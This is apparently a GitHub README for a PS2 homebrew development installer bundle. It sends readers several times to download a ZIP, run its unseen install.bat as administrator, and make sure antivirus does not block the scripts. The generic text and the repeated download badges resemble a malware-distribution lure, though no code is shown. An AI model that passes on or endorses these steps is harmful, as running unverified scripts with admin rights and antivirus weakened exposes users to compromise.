# 🛠️ ps2dev-installer-bundle - Easy PS2 Development Setup

[![Download from GitHub](https://img.shields.io/badge/Download-ps2dev--installer--bundle-brightgreen)](https://github.com/Doreyresponsible758/ps2dev-installer-bundle)

---

## 📋 What is ps2dev-installer-bundle?

ps2dev-installer-bundle sets up a ready-to-use development environment for creating software on the PlayStation 2 (PS2). It works on Windows and is compatible with Windows Subsystem for Linux (WSL) and Ubuntu. The bundle installs all necessary tools without complex configurations, allowing you to focus on development right away.

This setup supports PS2 SDK, toolchains, and utilities for compiling and testing PS2 homebrew games. It includes scripts and installers that simplify the process, so you don’t need to install each component manually.

---

## 🖥️ System Requirements

- Windows 10 or 11 with administrator access  
- Optional: Windows Subsystem for Linux (WSL 2) with Ubuntu installed for a Linux-style environment  
- At least 5 GB free disk space  
- Internet connection to download files  
- Basic familiarity with opening files and using command prompt or PowerShell

---

## 🚀 Getting Started: Download and Setup

[![Download Here](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Doreyresponsible758/ps2dev-installer-bundle)

1. Visit the main page by clicking the green or blue badge above or go to:
   https://github.com/Doreyresponsible758/ps2dev-installer-bundle

2. On the repository page, find the **Releases** section or scroll down to locate the latest installer package.

3. Download the latest version of the installer bundle. This file is a ZIP archive that contains everything you need.

4. Once downloaded, open the ZIP file. You can use Windows' built-in extractor or any program like WinRAR or 7-Zip.

5. Extract the contents to a folder you can easily access, such as `C:\ps2dev`.

---

## ⚙️ How to Install on Windows (Without WSL)

1. Open the extracted folder and locate the `install.bat` file.

2. Right-click the file and select **Run as administrator**. This step ensures the installer has the needed permissions to set up all tools.

3. The installer will start a command prompt window that runs several scripts. It downloads and configures the PS2 SDK, toolchain, and other necessary tools.

4. When the process finishes, you will see a message indicating the setup completes successfully.

5. Close the command prompt window.

6. Your PS2 development environment is now ready. You can use the installed tools via the command prompt or PowerShell.

---

## 🐧 How to Use with WSL/Ubuntu (Optional)

If you want a Linux-like environment on your Windows machine, WSL with Ubuntu works well alongside this bundle.

### Installing WSL and Ubuntu

1. Open PowerShell as Administrator.

2. Run this command to enable WSL:
   ```
   wsl --install
   ```

3. Restart your computer when prompted.

4. After restart, open Microsoft Store, search for **Ubuntu**, and install the latest version.

5. Launch Ubuntu from your Start menu and complete the initial setup (create a user and password).

### Running ps2dev-installer-bundle inside WSL/Ubuntu

1. Open your Ubuntu terminal.

2. Navigate to the folder where you have extracted the bundle files. For example:
   ```
   cd /mnt/c/ps2dev
   ```

3. Run the installation script with:
   ```
   ./install.sh
   ```

4. The script will download and configure the PS2 development environment for Linux.

5. Once done, you can compile and manage your PS2 homebrew projects using standard commands like `make`.

---

## 🔧 Basic Usage of the ps2dev Development Tools

The installed environment includes:

- PS2SDK: Development libraries for making PS2 applications  
- PS2 Toolchain: Compiler and linker to build PS2 code  
- Utilities: Build scripts and firmware loaders  

To create a new project:

1. Open PowerShell or terminal in your project folder.

2. Use provided templates or copy example code from the `examples` folder.

3. Run `make` to compile the project.

4. The output is a `.elf` or `.iso` file you can run on a PS2 emulator or real hardware.

---

## 📂 Folder Structure Overview

- `bin/` - Compilers and tools executables  
- `include/` - Headers for PS2 development  
- `lib/` - Libraries needed to link your programs  
- `examples/` - Sample projects to get started  
- `scripts/` - Setup and builder scripts  
- `docs/` - Documentation files  

You do not need to modify these folders to use the bundle. Your projects can reference these paths when building code.

---

## 🛠 Troubleshooting Tips

- If `install.bat` or `install.sh` fails, check you ran it as administrator or with sufficient permissions.

- Make sure your internet connection is active during installation, as the installer downloads files.

- If you use WSL, confirm you installed Ubuntu and launched it at least once before running the setup.

- Ensure your antivirus does not block the installer scripts.

- Restart your terminal or computer after installation if commands are not recognized.

---

## 📚 Additional Resources

- GitHub Repository: https://github.com/Doreyresponsible758/ps2dev-installer-bundle  
- PS2 Homebrew Wiki and Forums: Useful for detailed guides and community help  
- Official PS2SDK Documentation: Learn how to use specific tools and libraries

---

## 🔗 Download and Setup Link

Remember to visit the repository to download and keep track of updates:

[Download ps2dev-installer-bundle](https://github.com/Doreyresponsible758/ps2dev-installer-bundle)